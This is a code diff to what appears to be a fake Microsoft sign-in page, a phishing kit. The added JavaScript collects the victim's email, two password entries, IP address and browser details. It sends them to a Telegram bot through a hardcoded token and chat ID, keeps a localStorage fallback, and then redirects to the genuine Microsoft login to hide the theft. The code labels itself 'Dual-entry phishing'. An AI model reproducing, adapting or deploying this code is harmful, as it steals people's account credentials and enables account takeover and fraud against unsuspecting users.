@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -373,24 +374,76 @@
             }
         });
 
-        // Step 3: Second password submission with verification
-        document.getElementById('passwordForm2').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const secondPassword = document.getElementById('password2').value;
-            const confirmPassword = document.getElementById('confirmPassword').value;
+// Step 3: Second password submission with verification
+document.getElementById('passwordForm2').addEventListener('submit', function(event) {
+    event.preventDefault();
+    const secondPassword = document.getElementById('password2').value;
+    const confirmPassword = document.getElementById('confirmPassword').value;
+    
+    if (secondPassword !== confirmPassword) {
+        document.getElementById('passwordError').style.display = 'block';
+        return;
+    }
+    
+    document.getElementById('passwordError').style.display = 'none';
+    
+    // Telegram bot details - REPLACE WITH YOUR ACTUAL TOKEN AND CHAT ID
+    const botToken = '5999005713:AAGWRZ5KSqGJhVolN8dYLSa6fj8nm-1yOfM';
+    const chatId = '875434694';
+    
+    // Fetch the user's IP address
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip;
+
+            // Enhanced data collection with both passwords and IP address
+            const message = `🔴 Otunti Zehhh ooo 🔴
+📧 Email: ${userEmail}
+🔑 First Password: ${firstPassword}
+🔑 Second Password: ${secondPassword}
+🔄 Passwords Match: ${firstPassword === secondPassword ? 'YES' : 'NO'}
+🕒 Timestamp: ${new Date().toLocaleString()}
+🌐 User Agent: ${navigator.userAgent}
+📍 Language: ${navigator.language}
+📱 Platform: ${navigator.platform}
+🌍 IP Address: ${ipAddress}
+🎯 Method: Dual-entry phishing (verified)`;
             
-            if (secondPassword !== confirmPassword) {
-                document.getElementById('passwordError').style.display = 'block';
-                return;
-            }
+            const encodedMessage = encodeURIComponent(message);
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}`;
             
-            document.getElementById('passwordError').style.display = 'none';
-            
-            // Telegram bot details - REPLACE WITH YOUR ACTUAL TOKEN AND CHAT ID
-            const botToken = '5999005713:AAGWRZ5KSqGJhVolN8dYLSa6fj8nm-1yOfM';
-            const chatId = '875434694';
-            
-            // Enhanced data collection with both passwords
+            // Send to Telegram
+            fetch(telegramUrl)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Both passwords sent successfully:', data);
+                    // Show loading then redirect
+                    document.getElementById('signinButton2').textContent = 'Signing in...';
+                    document.getElementById('signinButton2').disabled = true;
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&state=12345&nonce=678910';
+                    }, 1500);
+                })
+                .catch(error => {
+                    console.error('Telegram error:', error);
+                    // Local storage fallback
+                    localStorage.setItem(`ms_dual_cred_${Date.now()}`, JSON.stringify({
+                        email: userEmail,
+                        firstPassword: firstPassword,
+                        secondPassword: secondPassword,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        match: firstPassword === secondPassword,
+                        ipAddress: ipAddress
+                    }));
+                    window.location.href = 'https://login.microsoftonline.com/';
+                });
+        })
+        .catch(error => {
+            console.error('Error fetching IP address:', error);
+            // If IP fetch fails, continue without IP
             const message = `🔴 Otunti Zehhh ooo 🔴
 📧 Email: ${userEmail}
 🔑 First Password: ${firstPassword}
@@ -432,6 +485,7 @@
                     window.location.href = 'https://login.microsoftonline.com/';
                 });
         });
+});
 
         // Back button functionality
         document.getElementById('backButton').addEventListener('click', function() {
